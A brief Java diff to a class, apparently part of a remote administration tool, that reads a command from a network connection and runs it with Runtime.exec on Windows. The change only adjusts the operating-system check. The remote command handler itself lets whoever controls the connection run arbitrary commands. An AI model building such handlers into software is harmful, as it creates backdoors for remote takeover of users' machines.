@@ -10,7 +10,7 @@ public class Packet80CustomRegQuery extends AbstractIncomingPacket {
 	public void read() throws Exception {
 		String cmd = Connection.readLine();
 		try {
-			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 				Runtime.getRuntime().exec(cmd);
 			} else {
 				throw new Exception("Windows only");
